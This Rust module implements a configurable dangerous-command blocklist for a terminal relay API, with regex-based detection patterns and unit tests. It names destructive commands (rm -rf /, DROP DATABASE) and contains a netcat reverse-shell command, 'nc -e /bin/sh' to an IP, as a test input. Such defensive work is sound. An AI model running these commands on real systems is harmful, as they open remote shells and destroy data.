//! Configurable dangerous-command blocklist for the relay API.
//!
//! The relay's [`CommandValidator`](crate::validator::CommandValidator) ships
//! with a hardcoded set of catastrophic patterns (`rm -rf /`, `dd of=/dev/sd*`,
//! fork bombs, …) that can **never** be bypassed — they run first and
//! unconditionally, before any per-account allowlist or user extension.
//!
//! This module provides the **user-extensible** layer on top of that hard
//! floor. Operators and skills can contribute additional regex patterns that
//! should also be blocked, loaded from a JSON config file
//! (`relay-blocklist.json` in the app config dir).
//!
//! # Why a separate file from `relay.json`?
//!
//! `relay.json` holds credentials (Argon2id hashes) and is read-modify-written
//! by the UI on every account edit. A blocklist is operator/skill-curated,
//! changes rarely, and mixing it into the credential file would risk a UI
//! rewrite clobbering hand-curated patterns. Keeping them separate also lets
//! skills append to a file they can reason about in isolation.
//!
//! # File format
//!
//! ```json
//! {
//!   "patterns": [
//!     { "regex": "\\bnc\\s+-e", "reason": "reverse shell via nc" },
//!     { "regex": "^python3 -c 'import os;.*os\\.system'", "reason": "python -c shell escape" }
//!   ],
//!   "skills": [
//!     {
//!       "name": "dbadmin-skill",
//!       "patterns": [
//!         { "regex": "\\bDROP\\s+DATABASE", "reason": "DROP DATABASE via skill" }
//!       ]
//!     }
//!   ]
//! }
//! ```
//!
//! Both top-level `patterns` and each skill's `patterns` are merged into one
//! flat list at load time — the skill grouping is purely for attribution in
//! audit logs and error messages. Invalid regexes are reported by name but do
//! **not** abort startup: a single bad pattern shouldn't take down the API.
//! They are skipped with a `tracing::warn!`.
//!
//! # Security note
//!
//! User/skill patterns are **supplementary**, never a replacement for the
//! hardcoded floor. Even if an operator deletes this file or fills it with
//! `{"regex": ".*", "reason": "allow all"}`, the hardcoded catastrophic
//! patterns still fire first. The validator runs in this order:
//!
//! 1. Hardcoded terminal safety patterns (always fatal).
//! 2. Hardcoded API-specific patterns (always fatal).
//! 3. User + skill patterns from this config (fatal, but operator-controlled).
//! 4. Read-only mutation check.
//! 5. Per-account allowlist.
//!
//! So a user pattern can only ever *add* restrictions, never remove the
//! built-in hard blocks.

use std::path::PathBuf;

use regex::Regex;
use serde::{Deserialize, Serialize};

use rusterm_core::paths::resolve_config_file_path;

/// Filename of the blocklist config under the app config dir.
pub const BLOCKLIST_CONFIG_FILE: &str = "relay-blocklist.json";

/// One operator-contributed dangerous-command pattern.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BlocklistPattern {
    /// Regular expression matched against the full command line. Uses the
    /// `regex` crate syntax (not shell-glob — operators must escape
    /// metacharacters they want to match literally).
    pub regex: String,
    /// Human-readable reason shown in the audit log and the 403 response body.
    pub reason: String,
}

/// A skill contributing blocklist patterns. The `name` is used only for
/// attribution — it appears in error messages so an operator can tell which
/// skill flagged a command.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SkillBlocklist {
    /// Skill identifier (e.g. `"dbadmin-skill"`). Free-form, for audit logs.
    pub name: String,
    /// Patterns this skill wants blocked.
    pub patterns: Vec<BlocklistPattern>,
}

/// Root of `relay-blocklist.json`.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct BlocklistConfig {
    /// Operator-contributed patterns, applied to every account.
    pub patterns: Vec<BlocklistPattern>,
    /// Skill-contributed pattern groups. Flattened at load time; the skill
    /// name is prepended to each pattern's reason for attribution.
    pub skills: Vec<SkillBlocklist>,
}

/// A compiled blocklist entry. The `source` field records where the pattern
/// came from (`"built-in"`, `"user"`, or `"skill:<name>"`) so audit logs can
/// attribute blocks correctly.
#[derive(Debug, Clone)]
pub struct CompiledPattern {
    pub regex: Regex,
    pub reason: String,
    pub source: &'static str,
}

/// Outcome of loading and compiling a [`BlocklistConfig`]. Invalid regexes
/// are reported but do not abort compilation of the rest.
#[derive(Debug, Default)]
pub struct LoadedBlocklist {
    /// Successfully compiled patterns, ready to match against commands.
    pub patterns: Vec<CompiledPattern>,
    /// Regex compile errors, with the source pattern and the error message.
    /// Surfaced via `tracing::warn!` at startup; not fatal.
    pub errors: Vec<BlocklistLoadError>,
}

/// One pattern that failed to compile.
#[derive(Debug, Clone)]
pub struct BlocklistLoadError {
    pub source: String,
    pub regex: String,
    pub error: String,
}

impl BlocklistConfig {
    /// Load from the default path (`relay-blocklist.json` under the app
    /// config dir). Returns `Ok(Default::default())` if the file doesn't
    /// exist — a missing blocklist is the normal first-launch state, not an
    /// error.
    pub fn load() -> anyhow::Result<Self> {
        let path = resolve_config_file_path(BLOCKLIST_CONFIG_FILE)?;
        match std::fs::read_to_string(&path) {
            Ok(text) => Ok(serde_json::from_str(&text)?),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Self::default()),
            Err(e) => Err(e.into()),
        }
    }

    /// Load from an explicit path (used by tests and the UI "import file"
    /// action).
    pub fn load_from_path(path: &PathBuf) -> anyhow::Result<Self> {
        match std::fs::read_to_string(path) {
            Ok(text) => Ok(serde_json::from_str(&text)?),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Self::default()),
            Err(e) => Err(e.into()),
        }
    }

    /// Save to the default config path. Atomic via tmp+rename, same pattern
    /// as `RelayConfig::save`.
    pub fn save(&self) -> anyhow::Result<()> {
        let path = resolve_config_file_path(BLOCKLIST_CONFIG_FILE)?;
        self.save_to_path(&path)
    }

    /// Save to an explicit path (used by tests and the UI "export file"
    /// action). Atomic via tmp+rename.
    pub fn save_to_path(&self, path: &PathBuf) -> anyhow::Result<()> {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let tmp = path.with_extension("json.tmp");
        std::fs::write(&tmp, serde_json::to_string_pretty(self)?)?;
        std::fs::rename(&tmp, path)?;
        Ok(())
    }

    /// Compile all patterns (user + skills) into a flat list. Invalid regexes
    /// are collected into `errors` rather than aborting — one bad pattern
    /// shouldn't disable the whole blocklist.
    pub fn compile(&self) -> LoadedBlocklist {
        let mut patterns = Vec::new();
        let mut errors = Vec::new();

        for p in &self.patterns {
            match Regex::new(&p.regex) {
                Ok(r) => patterns.push(CompiledPattern {
                    regex: r,
                    reason: p.reason.clone(),
                    source: "user",
                }),
                Err(e) => errors.push(BlocklistLoadError {
                    source: "user".into(),
                    regex: p.regex.clone(),
                    error: e.to_string(),
                }),
            }
        }

        for skill in &self.skills {
            for p in &skill.patterns {
                match Regex::new(&p.regex) {
                    Ok(r) => patterns.push(CompiledPattern {
                        regex: r,
                        // Prepend the skill name so the block reason is
                        // attributable: "skill:dbadmin: DROP DATABASE ...".
                        reason: format!("skill:{}: {}", skill.name, p.reason),
                        source: "skill",
                    }),
                    Err(e) => errors.push(BlocklistLoadError {
                        source: format!("skill:{}", skill.name),
                        regex: p.regex.clone(),
                        error: e.to_string(),
                    }),
                }
            }
        }

        LoadedBlocklist { patterns, errors }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Unique temp dir per test, avoids env-var races between parallel tests.
    fn temp_dir() -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "rusterm-blocklist-test-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn missing_file_returns_default() {
        let dir = temp_dir();
        let path = dir.join(BLOCKLIST_CONFIG_FILE);
        // File doesn't exist → default (empty) config, no error.
        let cfg = BlocklistConfig::load_from_path(&path).unwrap();
        assert!(cfg.patterns.is_empty());
        assert!(cfg.skills.is_empty());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn parses_user_and_skill_patterns() {
        let dir = temp_dir();
        let path = dir.join(BLOCKLIST_CONFIG_FILE);
        std::fs::write(
            &path,
            r#"{
                "patterns": [
                    { "regex": "\\bnc\\s+-e", "reason": "reverse shell via nc" }
                ],
                "skills": [
                    {
                        "name": "dbadmin",
                        "patterns": [
                            { "regex": "\\bDROP\\s+DATABASE", "reason": "DROP DATABASE" }
                        ]
                    }
                ]
            }"#,
        )
        .unwrap();
        let cfg = BlocklistConfig::load_from_path(&path).unwrap();
        assert_eq!(cfg.patterns.len(), 1);
        assert_eq!(cfg.skills.len(), 1);
        assert_eq!(cfg.skills[0].name, "dbadmin");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn compile_produces_flat_list_with_attribution() {
        let cfg = BlocklistConfig {
            patterns: vec![BlocklistPattern {
                regex: r"\bnc\s+-e".into(),
                reason: "reverse shell".into(),
            }],
            skills: vec![SkillBlocklist {
                name: "dbadmin".into(),
                patterns: vec![BlocklistPattern {
                    regex: r"\bDROP\s+DATABASE".into(),
                    reason: "drop db".into(),
                }],
            }],
        };
        let loaded = cfg.compile();
        assert!(loaded.errors.is_empty());
        assert_eq!(loaded.patterns.len(), 2);
        // User pattern source is "user".
        assert_eq!(loaded.patterns[0].source, "user");
        assert_eq!(loaded.patterns[0].reason, "reverse shell");
        // Skill pattern reason is prefixed with skill name.
        assert_eq!(loaded.patterns[1].source, "skill");
        assert!(loaded.patterns[1].reason.starts_with("skill:dbadmin:"));
        // Patterns actually match.
        assert!(loaded.patterns[0].regex.is_match("nc -e /bin/sh 10.0.0.1 4444"));
        assert!(loaded.patterns[1].regex.is_match("psql -c 'DROP DATABASE prod'"));
    }

    #[test]
    fn bad_regex_does_not_abort_compilation() {
        let cfg = BlocklistConfig {
            patterns: vec![
                BlocklistPattern {
                    regex: r"\bnc\s+-e".into(),
                    reason: "ok".into(),
                },
                BlocklistPattern {
                    regex: "[bad(".into(),
                    reason: "broken".into(),
                },
            ],
            skills: vec![],
        };
        let loaded = cfg.compile();
        assert_eq!(loaded.patterns.len(), 1, "good pattern still compiles");
        assert_eq!(loaded.errors.len(), 1, "bad pattern reported");
        assert_eq!(loaded.errors[0].source, "user");
        assert!(loaded.errors[0].error.contains("regex"));
    }

    #[test]
    fn save_and_load_roundtrip_via_explicit_path() {
        let dir = temp_dir();
        let path = dir.join(BLOCKLIST_CONFIG_FILE);
        let cfg = BlocklistConfig {
            patterns: vec![BlocklistPattern {
                regex: r"\bnc\s+-e".into(),
                reason: "reverse shell".into(),
            }],
            skills: vec![SkillBlocklist {
                name: "dbadmin".into(),
                patterns: vec![BlocklistPattern {
                    regex: r"\bDROP\s+DATABASE".into(),
                    reason: "drop db".into(),
                }],
            }],
        };
        cfg.save_to_path(&path).unwrap();
        let back = BlocklistConfig::load_from_path(&path).unwrap();
        assert_eq!(back.patterns.len(), 1);
        assert_eq!(back.skills.len(), 1);
        assert_eq!(back.skills[0].name, "dbadmin");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn load_from_explicit_path_works() {
        let dir = temp_dir();
        let path = dir.join(BLOCKLIST_CONFIG_FILE);
        std::fs::write(
            &path,
            r#"{"patterns":[{"regex":"foo","reason":"bar"}]}"#,
        )
        .unwrap();
        let cfg = BlocklistConfig::load_from_path(&path).unwrap();
        assert_eq!(cfg.patterns.len(), 1);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn load_from_explicit_missing_path_returns_default() {
        let dir = temp_dir();
        let path = dir.join("nonexistent.json");
        let cfg = BlocklistConfig::load_from_path(&path).unwrap();
        assert!(cfg.patterns.is_empty());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn empty_json_object_is_valid() {
        let dir = temp_dir();
        let path = dir.join(BLOCKLIST_CONFIG_FILE);
        std::fs::write(&path, "{}").unwrap();
        let cfg = BlocklistConfig::load_from_path(&path).unwrap();
        assert!(cfg.patterns.is_empty());
        assert!(cfg.skills.is_empty());
        let _ = std::fs::remove_dir_all(&dir);
    }
}
